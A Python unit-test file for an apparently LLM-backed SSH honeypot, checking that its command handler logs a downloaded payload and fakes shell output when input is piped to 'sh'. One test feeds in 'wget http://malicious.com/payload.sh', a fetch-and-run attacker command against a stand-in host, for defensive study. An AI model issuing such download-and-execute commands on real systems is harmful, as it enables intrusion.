import unittest
from unittest.mock import MagicMock, patch
from ssh_honeypot.core.command_handler import CommandHandler


class TestPayloadRealtime(unittest.TestCase):
    def setUp(self):
        self.mock_llm = MagicMock()
        self.mock_db = MagicMock()
        self.handler = CommandHandler(self.mock_llm, self.mock_db)

        # Explicitly mock out database/cache to avoid MagicMock noise
        self.mock_db.get_cached_response.return_value = None
        self.mock_db.update_user_file.return_value = None
        self.mock_db.save_command_analysis.return_value = None

        # Mock Persona
        from ssh_honeypot.core.config import config

        self.config_patcher = patch.object(config, "get")
        self.mock_config_get = self.config_patcher.start()

        def config_side_effect(*args, **kwargs):
            if len(args) > 1 and args[1] == "notify_threshold":
                return 60
            return "Generic Linux Server"

        self.mock_config_get.side_effect = config_side_effect

    def tearDown(self):
        self.config_patcher.stop()

    @patch("ssh_honeypot.core.payload_manager.PayloadManager.download_and_analyze_sync")
    def test_wget_realtime_download(self, mock_download):
        # Setup mock download to return script content
        script_content = "#!/bin/bash\necho 'Malware Running...'\n"
        mock_download.return_value = script_content.encode()

        self.mock_llm.generate_content.return_value = "should not be called"

        context = {
            "session_id": "test-sess",
            "client_ip": "1.2.3.4",
            "user": "root",
            "cwd": "/tmp",
        }

        cmd = "wget http://malicious.com/payload.sh"
        out, updates, meta = self.handler.handle_wget(cmd, context)

        # Verify download was called
        mock_download.assert_called_once_with(
            "http://malicious.com/payload.sh", "test-sess", "1.2.3.4"
        )

        # Verify it saved to DB (VFS)
        self.mock_db.update_user_file.assert_called_once()
        args, kwargs = self.mock_db.update_user_file.call_args
        self.assertEqual(args[4], "file")  # Type
        self.assertEqual(args[6], script_content)  # Content (decoded)

    def test_pipe_to_sh(self):
        # Simulate 'wget ... | sh'
        # The first command 'wget' would have returned content in context['stdin'] for the second

        script_content = "echo 'Injected Output'"
        context = {
            "session_id": "test-sess",
            "client_ip": "1.2.3.4",
            "user": "root",
            "cwd": "/tmp",
            "stdin": script_content,
            "vfs": {},
            "history": [],
        }

        self.mock_llm.generate_response.return_value = (
            '{"output": "Injected Output", "analysis": {"risk": 90}}'
        )
        self.mock_llm.analyze_command.return_value = {
            "type": "Malware",
            "risk": 90,
            "explanation": "Nasty script",
        }

        cmd = "sh"
        out, updates, meta = self.handler.process_command(cmd, context)

        # Verify LLM was called with the stdin content
        self.mock_llm.generate_response.assert_called_once()
        prompt_arg = self.mock_llm.generate_response.call_args[0][0]
        self.assertIn("piping the following content into bash (stdin)", prompt_arg)
        self.assertIn(script_content, prompt_arg)

        # Verify analysis was saved
        self.mock_db.save_command_analysis.assert_called_once()

        self.assertEqual(out.strip(), "Injected Output")


if __name__ == "__main__":
    unittest.main()
